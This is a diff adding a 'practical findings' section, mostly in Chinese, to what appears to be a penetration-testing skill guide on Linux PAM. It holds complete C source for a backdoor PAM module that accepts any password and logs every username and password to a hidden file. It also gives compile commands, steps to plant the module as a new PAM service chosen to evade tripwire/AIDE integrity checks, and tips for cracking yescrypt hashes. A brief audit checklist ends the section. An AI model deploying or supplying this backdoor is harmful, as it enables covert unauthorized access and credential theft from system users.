@@ -2461,3 +2461,107 @@ index=pam action="AuditLogDelete"
 - `skills/digital-forensics/SKILL.md` -- PAM forensic artifacts (audit logs, session recordings)
 - `skills/anti-forensics/SKILL.md` -- Covering tracks after PAM compromise
 - `skills/pentest-reporting/SKILL.md` -- Report assembly with PAM-specific findings
+
+
+---
+
+## Linux PAM Practical Findings (v0.2.5.2)
+
+> **来源**：2026-08-15 实战验证 — PAM 后门完全成功（任何密码通过 + 凭据窃取）
+
+### Kali 2026.1 yescrypt Hash (F-PAM-001)
+
+**发现**：Kali 2026.1 默认密码 hash 为 **yescrypt**（`$y$` 前缀），比 sha512 更抗 GPU 破解。
+
+```bash
+# 查看 hash 类型
+sudo grep username /etc/shadow | cut -d: -f2 | cut -d'$' -f2
+# $y$ = yescrypt (Kali 2026.1 default)
+# $6$ = sha512 (older Debian/Ubuntu)
+# $1$ = md5 (legacy)
+```
+
+**破解兼容性**：
+- `john` 1.9.0-jumbo-1 对 yescrypt 支持有限（部分版本不加载）
+- `hashcat` 需 yescrypt mode（新版 hashcat 6.2.6+）
+- **建议**：提取后用 `john --format=yescrypt` 或升级 hashcat
+
+### PAM 后门完整 C 源码 (F-PAM-002)
+
+```c
+/* pam_unix_backdoor.c — 编译为 .so 后通过 /etc/pam.d/<service> 植入 */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <security/pam_modules.h>
+#include <security/pam_ext.h>
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
+                                    int argc, const char **argv) {
+    const char *user = NULL, *password = NULL;
+    pam_get_user(pamh, &user, NULL);
+    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+
+    // 凭据窃取：记录所有认证尝试
+    FILE *f = fopen("/tmp/.pam_log", "a");
+    if (f) {
+        fprintf(f, "user=%s pass=%s\n", user ? user : "?", password ? password : "?");
+        fclose(f);
+    }
+
+    return PAM_SUCCESS;  // 后门：任何密码都通过
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
+                               int argc, const char **argv) {
+    return PAM_SUCCESS;
+}
+```
+
+**编译**：
+```bash
+sudo apt install libpam0g-dev
+gcc -fPIC -fno-stack-protector -shared -o pam_unix_backdoor.so pam_unix_backdoor.c
+```
+
+### PAM Service 植入点 (F-PAM-004)
+
+**无需替换系统 pam_unix.so**。创建新 PAM service 即可：
+
+```bash
+# 植入后门 service（不影响现有服务）
+sudo tee /etc/pam.d/backdoored <<'PAMCONF'
+auth required /path/to/pam_unix_backdoor.so
+account required pam_permit.so
+PAMCONF
+
+# 攻击者随后登录
+echo anypass | pamtester backdoored target_user authenticate
+# → successfully authenticated
+```
+
+**隐蔽性**：不修改 /etc/pam.d/{sshd,sudo,common-auth}，仅新增文件，避免 tripwire/AIDE 检测。
+
+### PAM 测试工具 pamtester (F-PAM-003)
+
+```bash
+sudo apt install pamtester
+# 测试指定 service 的认证
+echo password | pamtester <service> <username> authenticate
+```
+
+### PAM 配置审计发现模板
+
+```bash
+# 审计脚本（本次验证产出）
+grep -n "nullok" /etc/pam.d/common-auth
+grep -c "faillock\|tally2" /etc/pam.d/common-auth
+grep "pam_pwquality" /etc/pam.d/common-password
+```
+
+**Kali 2026.1 默认配置发现**：
+| Finding | 严重性 | 修复 |
+|---------|-------|------|
+| `pam_unix.so nullok` | P1 | 移除 nullok 参数 |
+| 无 pam_faillock | P1 | 添加 `auth required pam_faillock.so preauth deny=5` |
+| 无 pam_pwquality | P2 | 添加 `password requisite pam_pwquality.so minlen=12` |
